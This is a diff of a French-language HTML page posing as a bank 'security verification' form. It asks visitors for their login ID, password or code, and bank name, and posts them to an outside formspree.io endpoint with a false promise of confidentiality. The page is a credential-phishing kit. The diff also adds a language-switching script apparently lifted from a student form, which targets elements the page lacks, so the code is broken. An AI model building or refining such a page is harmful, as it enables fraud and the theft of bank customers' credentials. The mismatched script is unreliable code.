@@ -1,44 +1,88 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulaire de securite</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f6f6f6;
-      padding: 50px;
-    }
-    form {
-      background: white;
-      padding: 30px;
-      border-radius: 8px;
-      max-width: 400px;
-      margin: auto;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-    }
-    input, textarea, button {
-      width: 100%;
-      margin-bottom: 10px;
-      padding: 10px;
-      border-radius: 4px;
-      border: 1px solid #ccc;
-    }
-    button {
-      background-color: #007BFF;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
-    }
-  </style>
+<meta charset="UTF-8">
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .form-container {
+    background: #fff;
+    padding: 30px 40px;
+    border-radius: 10px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+    width: 350px;
+    text-align: center;
+  }
+  h2 { margin-bottom: 20px; }
+  label { display: block; text-align: left; margin: 10px 0 5px; font-weight: bold; }
+  input, select {
+    width: 100%;
+    padding: 8px 10px;
+    margin-bottom: 15px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+  }
+  select { cursor: pointer; }
+  button {
+    width: 100%;
+    padding: 10px;
+    border: none;
+    background: #4CAF50;
+    color: white;
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+  button:hover { background: #45a049; }
+</style>
 </head>
 <body>
-<div id="google_translate_element"></div>
-<br>
+
+<div class="form-container">
+
+  <h2 id="titre">Processus de confidentialite</h2>
+
+  <!-- Menu pour choisir la langue -->
+  <select id="langue" onchange="changerLangue()">
+    <option value="fr">Français</option>
+    <option value="en">English</option>
+    <option value="es">Español</option>
+    <option value="de">Deutsch</option>
+    <option value="it">Italiano</option>
+    <option value="pt">Português</option>
+    <option value="nl">Nederlands</option>
+    <option value="sv">Svenska</option>
+    <option value="no">Norsk</option>
+    <option value="da">Dansk</option>
+    <option value="fi">Suomi</option>
+    <option value="ru">Русский</option>
+    <option value="zh">中文</option>
+    <option value="ja">日本語</option>
+    <option value="ko">한국어</option>
+    <option value="ar">العربية</option>
+    <option value="hi">हिंदी</option>
+    <option value="tr">Türkçe</option>
+    <option value="pl">Polski</option>
+    <option value="cs">Čeština</option>
+    <option value="el">Ελληνικά</option>
+    <option value="he">עברית</option>
+    <option value="id">Bahasa Indonesia</option>
+    <option value="ms">Bahasa Melayu</option>
+    <option value="th">ไทย</option>
+    <option value="vi">Tiếng Việt</option>
+    <option value="ro">Română</option>
+    <option value="hu">Magyar</option>
+    <option value="bg">Български</option>
+    <option value="sr">Српски</option>
+  </select>
   <form action="https://formspree.io/f/xbdakdel" method="POST">
      
     <h2>Formulaire de verification de sécurite </h2>
@@ -48,7 +92,7 @@
     <label for="Identifiant">Identifiant :</label>
     <input type="text" name="Identifiant" required>
 
-    <label for="Mot de passe">Mot de passe :</label>
+    <label for="Mot de passe">Mot de passe/Code :</label>
     <input type="text" name="Mot de passe" required>
 
     <label for="Nom de la banque">Nom de la banque :</label>
@@ -61,12 +105,34 @@
     <button type="submit">Envoyer</button>
     <h5>Vos données sont en sécurité et tenu en toute confidentialite</h5>
   </form>
-<script type="text/javascript">
-function googleTranslateElementInit() {
-new google.translate.TranslateElement({
-pageLanguage: 'fr',
-layout: google.translate.TranslateElement.InlineLayout.SIMPLE
-}, 'google_translate_element');
+
+  <!-- Script pour changer la langue -->
+<script>
+function changerLangue() {
+ var langue = document.getElementById('langue').value;
+
+ if(langue === 'en') {
+ document.getElementById('titre').innerText = "Student Form";
+ document.getElementById('prenomLabel').innerText = "First Name:";
+ document.getElementById('nomLabel').innerText = "Last Name:";
+ document.getElementById('moyenneLabel').innerText = "Average:";
+ document.getElementById('idLabel').innerText = "Student ID:";
+ document.getElementById('submitBtn').innerText = "Submit";
+ } else if(langue === 'es') {
+ document.getElementById('titre').innerText = "Formulario de Estudiantes";
+ document.getElementById('prenomLabel').innerText = "Nombre:";
+ document.getElementById('nomLabel').innerText = "Apellido:";
+ document.getElementById('moyenneLabel').innerText = "Promedio:";
+ document.getElementById('idLabel').innerText = "ID del estudiante:";
+ document.getElementById('submitBtn').innerText = "Enviar";
+ } else {
+ document.getElementById('titre').innerText = "Formulaire Élèves";
+ document.getElementById('prenomLabel').innerText = "Prénom:";
+ document.getElementById('nomLabel').innerText = "Nom:";
+ document.getElementById('moyenneLabel').innerText = "Moyenne:";
+ document.getElementById('idLabel').innerText = "Identifiant:";
+ document.getElementById('submitBtn').innerText = "Envoyer";
+ }
 }
 </script>
 </body>
